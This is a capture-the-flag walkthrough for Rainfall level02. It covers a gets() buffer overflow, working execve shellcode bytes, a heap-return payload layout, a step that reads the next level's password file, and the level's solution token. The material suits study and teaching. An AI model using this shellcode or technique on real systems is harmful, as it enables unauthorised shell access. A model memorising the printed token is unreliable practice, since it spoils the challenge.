# level02

1. Decompilation with Ghidra

    - Decompile the `level2` binary with Ghidra
    - The binary contains a function `p()` that:
      - Calls `gets()` to read user input into a 76-byte buffer
      - Checks if the return address starts with `0xb0` (stack protection)
      - Calls `puts()` to display the buffer
      - Calls `strdup()` to duplicate the buffer on the heap

2. Analysis of the vulnerability

    The decompiled code is:

    ```c
    void p(void) {
      uint unaff_retaddr;
      char local_50 [76];
      
      fflush(stdout);
      gets(local_50);        // Reads without size limit!
      if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
        printf("(%p)\n",unaff_retaddr);
        _exit(1);           // Prevents return to stack
      }
      puts(local_50);
      strdup(local_50);     // Copies buffer to heap!
      return;
    }
    ```

    The vulnerability:
    - **Buffer overflow** via `gets()` allows overwriting the return address
    - **Stack protection** prevents returning to stack addresses (0xb0...)
    - **`strdup()`** allocates our buffer on the **heap** (not protected!)

3. Finding the heap address

    Using GDB to find where `strdup()` allocates:

    ```bash
    gdb ./level2
    (gdb) break *0x0804853d    # Break after strdup() call
    (gdb) run <<< "AAAABBBBCCCCDDDD"
    (gdb) print/x $eax         # EAX contains the returned heap address
    (gdb) x/s $eax
    ```

    Or with ltrace:

    ```bash
    echo "AAAABBBBCCCCDDDD" | ltrace ./level2 2>&1 | grep strdup
    # Output: strdup("AAAABBBBCCCCDDDD") = 0x0804a008
    ```

    The heap address is: **0x0804a008**

4. Shellcode selection

    ```assembly
    xor ecx, ecx              ; ECX = NULL (no argv array needed)
    mul ecx                   ; EAX = 0, EDX = 0
    push ecx                  ; Push NULL terminator
    push 0x68732f2f           ; Push "//sh"
    push 0x6e69622f           ; Push "/bin"
    mov ebx, esp              ; EBX = pointer to "/bin//sh"
    mov al, 0x0b              ; EAX = 11 (execve syscall)
    int 0x80                  ; System call
    ```

    Shellcode bytes (21 bytes):

    ```
    \x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
    ```

5. Payload structure

    ```
    [Shellcode 21 bytes][Padding 59 bytes][Heap address 4 bytes]
    |                   |                  |
    |                   |                  +-> 0x0804a008 (little-endian)
    |                   +-> NOPs to reach 80 bytes
    +-> execve("/bin//sh", NULL, NULL)
    ```

    Total: 21 + 59 + 4 = 84 bytes

6. Exploitation

    Create the exploit on the Rainfall machine:

    ```bash
    cat > /tmp/exploit.py << 'EOF'
    [...python code...]
    EOF
    ```

    Generate and use the payload:

    ```bash
    python /tmp/exploit.py > /tmp/payload.txt
    (cat /tmp/payload.txt; cat) | ./level2
    ```

    This spawns a shell with level3 privileges:

    ```bash
    cat /home/user/level3/.pass
    ```

7. Token discovered

    The token is: `492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`
